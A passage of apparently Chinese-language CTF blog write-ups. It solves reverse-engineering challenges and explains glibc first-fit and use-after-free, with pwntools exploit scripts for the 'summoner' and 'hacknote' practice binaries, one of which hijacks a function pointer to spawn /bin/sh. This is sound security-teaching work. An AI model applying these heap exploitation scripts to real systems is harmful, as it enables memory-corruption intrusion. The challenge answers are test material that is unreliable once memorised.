id="Check-1n"><a href="#Check-1n" class="headerlink" title="Check_1n"></a>Check_1n</h2><p>开机密码<code>HelloWorld</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( a1 == <span class="number">3</span> &amp;&amp; dword_1B6CC08 == <span class="number">1</span> &amp;&amp; !dword_1C7672C )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(aHelloworld, byte_1C76740) )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_401005();</span><br><span class="line">    dword_1B6CC08 = <span class="number">0</span>;</span><br><span class="line">    dword_1B379B8 = <span class="number">0</span>;</span><br><span class="line">    byte_1C76740[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>在字符串中获得提示Base64解密得去玩打砖游戏, 直接死亡就能看到<code>flag</code>了（主要是一开始不知道怎么操作…..然后就死了</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/check1n-flag.jpg" alt="check1n-flag"></p><h2 id="BabyDriver"><a href="#BabyDriver" class="headerlink" title="BabyDriver"></a>BabyDriver</h2><p>主逻辑在<code>0x0000000140001380</code>, 很明显是个迷宫题, 迷宫大小为<code>16 * 14</code>, 然而在这里卡了很久, 因为不知道驱动获得的是<code>键盘扫描码</code>所以卡住了……..</p><p>迷宫:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">****************</span><br><span class="line">o.*..*......*..*</span><br><span class="line">*.**...**.*.*.**</span><br><span class="line">*.****.**.*.*.**</span><br><span class="line">*...**....*.*.**</span><br><span class="line">***..***.**.*..*</span><br><span class="line">*.**.***.**.**.*</span><br><span class="line">*.**.******.**.*</span><br><span class="line">*.**....***.**.*</span><br><span class="line">*.*****.***....*</span><br><span class="line">*...***.********</span><br><span class="line">**..***......<span class="comment">#**</span></span><br><span class="line">**.*************</span><br><span class="line">****************</span><br></pre></td></tr></table></figure><p>键盘扫描码对应:</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/BabyDriver-code.png" alt="BabyDriver-code"></p><p>其实就是<code>WASD</code>控制<code>上下左右</code></p><p>然后直接走迷宫就完事儿了, 解密脚本如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">path = <span class="string">b&quot;DSSSDDSDSSSDDDSSSDDDDDD&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(path)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag&#123;&quot;</span> + hashlib.md5(path).hexdigest().lower() + <span class="string">&quot;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="Chellys-identity"><a href="#Chellys-identity" class="headerlink" title="Chellys_identity"></a>Chellys_identity</h2><p><img src="chally-main.jpg" alt="image-20200524224403948"></p><p>首先是输入, 然后检查输入长度是否为16, 然后对字符串进行操作, 然后进行校验</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/chally-check-len.jpg" alt="chally-check-len"></p><p>重点在字符串操作那块</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/chally-entry.jpg" alt="chally-entry"></p><p>首先是取值i, i的范围是0-v8, v8一开始是0, 通过下面的v9语句进行自增, 也就是说这个i 的范围是从数组的v12从0开始到判断条件结束的值</p><p>而<code>sub_41325</code>函数主要是返回数组的内容</p><p>而判断条件<code>*i &lt; *v11</code>, 也就是说, 把v12数组中小于v11地址处的值的值取出来, 累加到v9, 然后和v11异或保存。而v11就是我们输入的字符串。</p><p>接着来看v12数组的值是这么来的</p><p><code>memset_v12</code>函数当然是将v12数组置零</p><p>重点看看<code>get_v12</code>函数:</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/challey-append.jpg" alt="challey-append"></p><p>判断一个条件, 然后把这个数存入v12数组, 接下来看看<code>check_if</code>函数</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/chally-zhi.jpg" alt="chally-zhi"></p><p>如果是质数, 那么保存。如此一来我们就可以知道, <strong>整个算法是将1-128的质数保存在数组, 然后依次遍历每个flag的字符, 将比字符小的质数累加的和与该字符异或, 最后对比</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v11[<span class="number">0</span>] = <span class="number">438</span>;</span><br><span class="line">v11[<span class="number">1</span>] = <span class="number">1176</span>;</span><br><span class="line">v11[<span class="number">2</span>] = <span class="number">1089</span>;</span><br><span class="line">v11[<span class="number">3</span>] = <span class="number">0x179</span>;</span><br><span class="line">v11[<span class="number">4</span>] = <span class="number">377</span>;</span><br><span class="line">v11[<span class="number">5</span>] = <span class="number">1600</span>;</span><br><span class="line">v11[<span class="number">6</span>] = <span class="number">924</span>;</span><br><span class="line">v11[<span class="number">7</span>] = <span class="number">377</span>;</span><br><span class="line">v11[<span class="number">8</span>] = <span class="number">1610</span>;</span><br><span class="line">v11[<span class="number">9</span>] = <span class="number">924</span>;</span><br><span class="line">v11[<span class="number">10</span>] = <span class="number">637</span>;</span><br><span class="line">v11[<span class="number">11</span>] = <span class="number">639</span>;</span><br><span class="line">v11[<span class="number">12</span>] = <span class="number">376</span>;</span><br><span class="line">v11[<span class="number">13</span>] = <span class="number">566</span>;</span><br><span class="line">v11[<span class="number">14</span>] = <span class="number">836</span>;</span><br><span class="line">v11[<span class="number">15</span>] = <span class="number">830</span>;</span><br><span class="line">v2 = sub_413A2(&amp;v15);</span><br><span class="line">v3 = (_DWORD *)sub_41519(v11, &amp;v12);</span><br><span class="line">sub_4155F(*v3, v3[<span class="number">1</span>], v2);</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  v4 = sub_411D6(a2, a1);</span><br><span class="line">  <span class="keyword">if</span> ( i &gt;= v4 )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  v5 = (_DWORD *)sub_41325(a2, a1, i);</span><br><span class="line">  <span class="keyword">if</span> ( *v5 != *(_DWORD *)sub_41325((<span class="keyword">int</span>)&amp;v17, a1, i) )</span><br><span class="line">  &#123;</span><br><span class="line">    v14 = <span class="number">0</span>;</span><br><span class="line">    v7 = sub_414D3((<span class="keyword">int</span>)&amp;v17);</span><br><span class="line">    LOBYTE(v7) = v14;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解密脚本:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">res = [<span class="number">0x000001B6</span>, <span class="number">0x00000498</span>, <span class="number">0x00000441</span>, <span class="number">0x00000179</span>, <span class="number">0x00000179</span>, <span class="number">0x00000640</span>, <span class="number">0x0000039C</span>, <span class="number">0x00000179</span>, <span class="number">0x0000064A</span>, <span class="number">0x0000039C</span>, <span class="number">0x0000027D</span>, <span class="number">0x0000027F</span>, <span class="number">0x00000178</span>, <span class="number">0x00000236</span>, <span class="number">0x00000344</span>, <span class="number">0x0000033E</span>]</span><br><span class="line">fib = [<span class="number">0x00000002</span>, <span class="number">0x00000003</span>, <span class="number">0x00000005</span>, <span class="number">0x00000007</span>, <span class="number">0x0000000B</span>, <span class="number">0x0000000D</span>, <span class="number">0x00000011</span>, <span class="number">0x00000013</span>, <span class="number">0x00000017</span>, <span class="number">0x0000001D</span>, <span class="number">0x0000001F</span>, <span class="number">0x00000025</span>, <span class="number">0x00000029</span>, <span class="number">0x0000002B</span>, <span class="number">0x0000002F</span>, <span class="number">0x00000035</span>, <span class="number">0x0000003B</span>, <span class="number">0x0000003D</span>, <span class="number">0x00000043</span>, <span class="number">0x00000047</span>, <span class="number">0x00000049</span>, <span class="number">0x0000004F</span>, <span class="number">0x00000053</span>, <span class="number">0x00000059</span>, <span class="number">0x00000061</span>, <span class="number">0x00000065</span>, <span class="number">0x00000067</span>, <span class="number">0x0000006B</span>, <span class="number">0x0000006D</span>, <span class="number">0x00000071</span>, <span class="number">0x0000007F</span>]</span><br><span class="line">dic = &#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_map</span>(<span class="params">a</span>):</span></span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> fib:</span><br><span class="line">        <span class="keyword">if</span> i&lt;a:</span><br><span class="line">            s+=i</span><br><span class="line">    <span class="keyword">return</span> s^a</span><br><span class="line"><span class="comment"># print(hex(get_map(ord(&#x27;f&#x27;))))</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">127</span>):</span><br><span class="line">    dic[get_map(i)] = <span class="built_in">chr</span>(i)</span><br><span class="line"><span class="built_in">print</span>(dic)</span><br><span class="line">s = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">    s+=dic[i]</span><br><span class="line"><span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure><p>flag:<code>Che11y_1s_EG0IST</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>first_fit And UAF</title>
      <link href="/note-pwn-first-fit-And-UAF/"/>
      <url>/note-pwn-first-fit-And-UAF/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="first-fit"><a href="#first-fit" class="headerlink" title="first fit"></a>first fit</h2><ul><li><p>这里通过<code>how2heap</code>中的<a href="https://github.com/shellphish/how2heap/blob/master/first_fit.c">fist_fit.c</a>理解glibc的fist fit算法</p></li><li><p>glibc使用一种first-fit算法来选择空闲的chunk.如果分配时存在一个大小满足要求的空闲chunk的话, glibc就会选择这个chunk</p></li></ul><p>fist_fit.c Code:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file doesn&#x27;t demonstrate an attack, but shows the nature of glibc&#x27;s allocator.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;glibc uses a first-fit algorithm to select a free chunk.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;If a chunk is free and large enough, malloc will select this chunk.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This can be exploited in a use-after-free situation.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating 2 buffers. They can be large, don&#x27;t have to be fastbin.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">char</span>* a = <span class="built_in">malloc</span>(<span class="number">0x512</span>);</span><br><span class="line">    <span class="keyword">char</span>* b = <span class="built_in">malloc</span>(<span class="number">0x256</span>);</span><br><span class="line">    <span class="keyword">char</span>* c;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st malloc(0x512): %p\n&quot;</span>, a);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd malloc(0x256): %p\n&quot;</span>, b);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;we could continue mallocing here...\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;now let&#x27;s put a string at a that we can read later \&quot;this is A!\&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(a, <span class="string">&quot;this is A!&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;first allocation %p points to %s\n&quot;</span>, a, a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We don&#x27;t need to free anything again. As long as we allocate smaller than 0x512, it will end up at %p\n&quot;</span>, a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;So, let&#x27;s allocate 0x500 bytes\n&quot;</span>);</span><br><span class="line">    c = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd malloc(0x500): %p\n&quot;</span>, c);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And put a different string here, \&quot;this is C!\&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(c, <span class="string">&quot;this is C!&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd allocation %p points to %s\n&quot;</span>, c, c);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;first allocation %p points to %s\n&quot;</span>, a, a);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;If we reuse the first allocation, it now holds the data from the third allocation.\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译运行:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  fist_fitAndUAF gcc fist_fit.c -o fist_fit</span><br><span class="line">➜  fist_fitAndUAF ./fist_fit</span><br><span class="line">This file doesn<span class="string">&#x27;t demonstrate an attack, but shows the nature of glibc&#x27;</span>s allocator.</span><br><span class="line">glibc uses a first-fit algorithm to select a free chunk.</span><br><span class="line">If a chunk is free and large enough, malloc will select this chunk.</span><br><span class="line">This can be exploited <span class="keyword">in</span> a use-after-free situation.</span><br><span class="line">Allocating 2 buffers. They can be large, don<span class="string">&#x27;t have to be fastbin.</span></span><br><span class="line"><span class="string">1st malloc(0x512): 0x7fffbc606260</span></span><br><span class="line"><span class="string">2nd malloc(0x256): 0x7fffbc606780</span></span><br><span class="line"><span class="string">we could continue mallocing here...</span></span><br><span class="line"><span class="string">now let&#x27;</span>s put a string at a that we can <span class="built_in">read</span> later <span class="string">&quot;this is A!&quot;</span></span><br><span class="line">first allocation 0x7fffbc606260 points to this is A!</span><br><span class="line">Freeing the first one...</span><br><span class="line">We don<span class="string">&#x27;t need to free anything again. As long as we allocate smaller than 0x512, it will end up at 0x7fffbc606260</span></span><br><span class="line"><span class="string">So, let&#x27;</span>s allocate 0x500 bytes</span><br><span class="line">3rd malloc(0x500): 0x7fffbc606260</span><br><span class="line">And put a different string here, <span class="string">&quot;this is C!&quot;</span></span><br><span class="line">3rd allocation 0x7fffbc606260 points to this is C!</span><br><span class="line">first allocation 0x7fffbc606260 points to this is C!</span><br><span class="line">If we reuse the first allocation, it now holds the data from the third allocation.</span><br></pre></td></tr></table></figure><p>虽然题目已经讲得很清楚, 但我还是想用自己的话来捋一下</p><ul><li>首先我们申请了两块堆内存:0x512（0x7fffbc606260）, 0x256（0x7fffbc606780）, 可以看到地址是不一样的, 这里根据nuoye大佬的说法, 申请0x256大小的堆块的意义在于防止我们第一次申请的0x512大小的堆块<code>free</code>后与top chunk合并</li><li>然后我们向0x512这块内存填数据</li><li>然后我们释放掉这块内存, 但是指向这块内存的指针A不置<code>0/NULL</code></li><li>接着我们申请一块0x500大小的堆块, 可以看到这个堆块的地址跟我们第一次申请的0x512大小堆块的地址是一样的！然后我们先假设指向这块内存的指针叫做C</li><li>然后填充这块数据为<code>this is C!</code></li><li>然后分别将指针A和指针C指向的内存的内容打印出来, 可以看到都是<code>this is C!</code></li><li>而这就是fist fit, 而释放内存后不把指针置零也是UAF的利用点</li></ul><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p><a href="https://github.com/SignorMercurio/Heap-Tutorials/blob/master/first%20fit%20%26%20uaf/Summoner/summoner">summoner</a></p><p>运行一下, 可以看到是一道菜单题:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  Summoner git:(master) ./summoner</span><br><span class="line">After you climb over the snow mountain, you encounter an evil summoner!</span><br><span class="line"></span><br><span class="line">He summoned <span class="string">&quot;The Dark Lord&quot;</span> Level 5! You have to get over his dead body to fight the Demon Dragon, but you can only summon Level 4 creatures!</span><br><span class="line"></span><br><span class="line">What<span class="string">&#x27;s your plan for now???</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Available plans:</span></span><br><span class="line"><span class="string">        show - show your creature and its level</span></span><br><span class="line"><span class="string">        summon [name] - summon a creature called [name]</span></span><br><span class="line"><span class="string">        level-up [level] - level up your creature (below Level 5)</span></span><br><span class="line"><span class="string">        strike - STRIKE the evil summoner&#x27;</span>s creature!!!</span><br><span class="line">        release - release your creature</span><br><span class="line">        quit - give up and die</span><br><span class="line"></span><br><span class="line">Enter your <span class="built_in">command</span>:</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>这里根据题目, 可以在IDA中创建如下结构体<code>character</code></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/fist_fit-struct.jpg" alt="fist_fit-struct"></p><p><code>getflag</code>的点在当输入<code>strike</code>命令时<code>level</code>要为<code>5</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( character )</span><br><span class="line">     &#123;</span><br><span class="line">       <span class="keyword">if</span> ( character-&gt;level == <span class="number">5</span> )</span><br><span class="line">         system(<span class="string">&quot;/bin/cat /pwn/flag&quot;</span>);</span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">         <span class="built_in">puts</span>(<span class="string">&quot;No, you cannot beat him!&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">     &#123;</span><br><span class="line">       <span class="built_in">puts</span>(<span class="string">&quot;Summon first.&quot;</span>);</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>然而我们最多只能用<code>level-up</code>到<code>4</code>:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v5 &lt;= <span class="number">4</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            character-&gt;level = v5;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Level-up to \&quot;%u\&quot;\n&quot;</span>, v5, v4);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Can only level-up to Level 4.&quot;</span>);</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure><p>而这个题目的问题在于, 当我们用<code>summon</code>创建一个角色后, 用<code>release</code>对其进行释放时, 只释放了<code>name</code>的内容, 并没有释放整个结构体, 这里可以用gdb（插件gef）调试进行观察</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb summoner</span><br><span class="line">r</span><br><span class="line">&gt; summon a</span><br><span class="line">[ctrl + c进行暂停]</span><br><span class="line">heap chunks</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/first_fit-summoner1.jpg" alt="first_fit-summoner1"></p><p>可以看到我们成功创建了两个堆块, 一个是结构体<code>character</code>, 另一个是我们的<code>name</code></p><p>接着我们升个级</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">c</span><br><span class="line">&gt; level-up 4</span><br><span class="line">[ctrl + c进行暂停]</span><br><span class="line">heap chunks</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/first_fit-summoner2.jpg" alt="first_fit-summoner2"></p><p>可以看到等级已经上升, 接着我们进行<code>release</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c</span><br><span class="line">&gt; release</span><br><span class="line">[ctrl + c进行暂停]</span><br><span class="line">heap chunks</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/first_fit-summoner3.jpg" alt="first_fit-summoner3"></p><p>可以看到名字的chunk里面的内容已经被释放, 但是<code>character</code>这个结构体却没有被释放（指向<code>name</code>的指针和等级依旧存在）, 那么当再次申请的时候就会申请到释放后<code>name</code>的地址!( <code>first fit</code>)</p><p>具体利用的话, 我们可以用写<code>name</code>为<code>a * 8 + &#39;\x05&#39;</code>, 此时<code>name</code>内容如下:</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/first_fit-summoner4.jpg" alt="first_fit-summoner4"></p><p>然后<code>release</code></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/first_fit-summoner5.jpg" alt="first_fit-summoner5"></p><p>然后再一次<code>summoner bbbb</code></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/first_fit-summoner6.jpg" alt="first_fit-summoner6"></p><p>可以看到此时等级已经是<code>5</code>了！</p><p>而这里我请教了nouye大佬, 为什么后8个字节不会被置零, 这里涉及到tcache的机制</p><blockquote><p>free的时候发现tcache未满, 就丢去tcache处理。这个过程就会把fd设置为之前free过的一个tcache, 其他地方保持原本的不变, 然后free就完成了。如果没有之前free过的那个tcache, 就置为0。</p></blockquote><p>这里我们用gdb调试来看 释放后可以看到这个堆内存被tcache回收</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/first_fit-summoner7.jpg" alt="first_fit-summoner7"></p><p>然后进行<code>strike</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">➜  work python3 summoner.py</span><br><span class="line">[+] Starting local process <span class="string">&#x27;./summoner&#x27;</span>: pid <span class="number">24183</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">/<span class="built_in">bin</span>/cat: /pwn/flag: No such file <span class="keyword">or</span> directory</span><br><span class="line"></span><br><span class="line">Enter your command:</span><br><span class="line">&gt; $  </span><br></pre></td></tr></table></figure><p>成功进入<code>getflag</code>环节！</p><p>完整脚本如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal=[<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">p = process(<span class="string">&quot;./summoner&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sla = p.sendlineafter</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;summon &#x27;</span> + <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + <span class="string">&#x27;\x05&#x27;</span>)</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">sla(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;release&#x27;</span>)</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">sla(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;summon bbbb&#x27;</span>)</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">sla(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;strike&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Use-After-Free"><a href="#Use-After-Free" class="headerlink" title="Use After Free"></a>Use After Free</h2><ul><li>Dangling pointer:（悬挂指针）指向被释放的内存的指针, 通常是由于释放内存后未将指针置null</li><li>Use After Free:对Dangling pointer所指向内存进行use, 如指针解引用等。</li></ul><h3 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h3><p>题目: <a href="https://github.com/SignorMercurio/Heap-Tutorials/blob/master/first%20fit%20%26%20uaf/hacknote/hacknote">hack note</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  hacknote git:(master) ./hacknote</span><br><span class="line">----------------------</span><br><span class="line">       HackNote</span><br><span class="line">----------------------</span><br><span class="line"> 1. Add note</span><br><span class="line"> 2. Delete note</span><br><span class="line"> 3. Print note</span><br><span class="line"> 4. Exit</span><br><span class="line">----------------------</span><br><span class="line">Your choice :</span><br></pre></td></tr></table></figure><p>该题提供了四个功能</p><ul><li>添加note<code>add note</code><ul><li>最多允许添加5个note</li><li>每个note有<code>puts</code>和<code>content</code>两个字段</li><li>puts会被设置成一个函数<code>print_note_content</code>, 即打印<code>content</code>内容</li></ul></li><li>删除note<code>delete note</code><ul><li>根据给定的索引来释放对应的 note</li></ul></li><li>打印note<code>print note</code><ul><li>根据给定的 note 的索引来输出对应索引的 note 的内容</li></ul></li><li>退出<code>exit</code><ul><li>就是退出</li></ul></li></ul><h4 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h4><p>IDA打开, 分析后可以知道漏洞点在</p><ul><li>在<code>print_note</code>函数中</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">result = (_DWORD *)((<span class="keyword">int</span> (__cdecl *)(_DWORD *))*notelist[v2])(notelist[v2]);</span><br></pre></td></tr></table></figure><p>以自身为参数调用函数, 而这个函数在<code>add_note</code>函数中被定义:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">*notelist[i] = print_note_content</span><br></pre></td></tr></table></figure><p>因此就是打印<code>note</code>中的内容</p><ul><li>在<code>del_note</code>函数中</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>((<span class="keyword">void</span> *)notelist[v2][<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">free</span>(notelist[v2]);</span><br></pre></td></tr></table></figure><p>free以后没有把指针置零</p><ul><li>在程序中存在<code>magic</code>函数</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">magic</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么我们的攻击思路就可以是<strong>通过UAF漏洞修改note的puts字段位magic函数的地址, 从而在执行print_note的时候执行magic函数</strong></p><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>脚本如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./hacknote&quot;</span>)</span><br><span class="line"></span><br><span class="line">sla = p.sendlineafter</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addnote</span>(<span class="params">size, content = <span class="string">&#x27;a&#x27;</span></span>):</span></span><br><span class="line">    sla(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delnote</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printnote</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x8048945</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">0x10</span>)</span><br><span class="line">addnote(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">delnote(<span class="number">0</span>)</span><br><span class="line">delnote(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">addnote(<span class="number">8</span>, p32(magic))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>具体思路如下:</p><ul><li><p>申请note0, content size 为16</p></li><li><p>申请note1, content size 为16</p><p>此时的堆</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span 